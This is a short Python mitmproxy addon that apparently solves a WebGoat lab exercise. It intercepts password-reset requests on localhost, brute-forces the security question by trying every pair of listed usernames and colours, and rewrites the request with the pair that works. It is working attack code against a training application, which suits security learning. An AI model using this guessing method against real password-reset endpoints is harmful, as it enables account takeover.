import itertools

from mitmproxy import http
from mitmproxy import ctx

import requests

RESET_ENDPOINT = 'http://localhost:8000/WebGoat/PasswordReset/questions'

USERNAMES = [
  'jerry',
  'admin',
  'tom',
  'webgoat',
]

COLORS = [
  'red',
  'orange',
  'yellow',
  'green',
  'blue',
  'purple',
  'brown',
  'magenta',
]

def request(flow: http.HTTPFlow) -> None:
  if 'PasswordReset/question' in flow.request.url:
    for username, color in itertools.product(USERNAMES, COLORS): 
      response = requests.post(
        flow.request.url,
        data={'username': username, 'securityQuestion': color},
        headers=flow.request.headers.copy(),
      )
      if response.json()['lessonCompleted']:
        print(f'User "{username}" has color "{color}"')
        flow.request.content = f'username={username}&securityQuestion={color}'.encode('utf-8')